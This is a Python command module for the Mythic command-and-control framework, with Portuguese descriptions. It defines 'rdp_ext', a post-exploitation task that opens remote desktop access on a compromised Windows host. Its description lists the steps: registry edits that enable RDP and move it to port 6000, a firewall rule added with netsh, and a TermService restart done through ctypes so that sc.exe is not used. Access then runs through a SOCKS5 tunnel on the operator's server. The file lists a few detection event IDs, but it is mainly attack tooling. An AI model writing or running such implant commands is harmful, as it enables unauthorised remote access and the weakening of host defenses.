from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class RdpExtArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "IP do alvo RDP (deve ser alcançável pelo agente). "
                    "Vazio = usa o IP local do próprio agente."
                ),
                default_value="",
            ),
            CommandParameter(
                name="port",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Nova porta RDP a configurar no host do agente. Padrão: 6000.",
                default_value=6000,
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Usuário RDP para os comandos de conexão.",
                default_value="",
            ),
            CommandParameter(
                name="password",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Senha RDP.",
                default_value="",
            ),
            CommandParameter(
                name="domain",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Domínio Windows (ex: COPEL).",
                default_value="",
            ),
            CommandParameter(
                name="socks_port",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Porta SOCKS5 a abrir no servidor Mythic. Padrão: 7005.",
                default_value=7005,
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            if self.command_line.strip().startswith('{'):
                d = json.loads(self.command_line)
                self.add_arg("target",     d.get("target",     ""))
                self.add_arg("port",       d.get("port",       6000))
                self.add_arg("username",   d.get("username",   ""))
                self.add_arg("password",   d.get("password",   ""))
                self.add_arg("domain",     d.get("domain",     ""))
                self.add_arg("socks_port", d.get("socks_port", 7005))
            else:
                # Posicional: [target] [user] [password] [domain]
                parts = self.command_line.strip().split()
                self.add_arg("target",     parts[0] if len(parts) > 0 else "")
                self.add_arg("username",   parts[1] if len(parts) > 1 else "")
                self.add_arg("password",   parts[2] if len(parts) > 2 else "")
                self.add_arg("domain",     parts[3] if len(parts) > 3 else "")
                self.add_arg("port",       6000)
                self.add_arg("socks_port", 7005)
        else:
            for k, v in [("target",""), ("port",6000), ("username",""),
                         ("password",""), ("domain",""), ("socks_port",7005)]:
                self.add_arg(k, v)


class RdpExtCommand(CommandBase):
    cmd         = "rdp_ext"
    needs_admin = False
    help_cmd    = "rdp_ext [target_ip] [username] [password] [domain]"
    description = (
        "Configura e ativa acesso RDP no host do agente via tunnel SOCKS5 (T1021.001/T1090).\n\n"
        "Execução no agente (Windows):\n"
        "  1. Habilita RDP: HKLM\\...\\Terminal Server\\fDenyTSConnections = 0\n"
        "  2. Muda porta: HKLM\\...\\RDP-Tcp\\PortNumber = 6000\n"
        "  3. Firewall: netsh advfirewall add rule TCP/6000 inbound\n"
        "  4. Reinicia TermService via ctypes SCM (sem sc.exe)\n"
        "  5. TCP probe em target:6000 → confirma RDP ativo\n"
        "  6. Retorna comandos xfreerdp/rdesktop prontos via SOCKS5\n\n"
        "Se target não for informado, usa o IP local do próprio agente.\n\n"
        "Pré-requisito no operador (Kali):\n"
        "  apt install freerdp2-x11   # xfreerdp (recomendado — SOCKS5 nativo)\n"
        "  apt install rdesktop        # alternativa\n\n"
        "Detecção no alvo:\n"
        "  EID 4946 (Firewall rule added), EID 7036 (TermService restart),\n"
        "  EID 4624 Logon Type 10 (se autenticação RDP bem-sucedida)"
    )
    version               = 1
    author                = "@wtechsec"
    attackmapping         = ["T1021.001", "T1090", "T1562.004"]
    supported_ui_features = []
    argument_class        = RdpExtArguments
    attributes            = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        target     = taskData.args.get_arg("target")     or "(auto)"
        username   = taskData.args.get_arg("username")   or ""
        domain     = taskData.args.get_arg("domain")     or ""
        port       = taskData.args.get_arg("port")       or 6000
        socks_port = taskData.args.get_arg("socks_port") or 7005

        # ── Inicia SOCKS5 no servidor Mythic ──────────────────────────────────
        socks_resp = await SendMythicRPCProxyStartCommand(MythicRPCProxyStartMessage(
            TaskID=taskData.Task.ID,
            PortType="socks",
            LocalPort=socks_port,
        ))
        if not socks_resp.Success:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response="[*] SOCKS5 nota (pode já estar ativo): {}\n".format(
                    socks_resp.Error).encode()
            ))

        # ── display_params ─────────────────────────────────────────────────────
        user_str = ""
        if domain and username:
            user_str = " {}\\{}".format(domain, username)
        elif username:
            user_str = " {}".format(username)

        response.DisplayParams = "target={} rdp_port={}{} socks={}".format(
            target, port, user_str, socks_port)
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
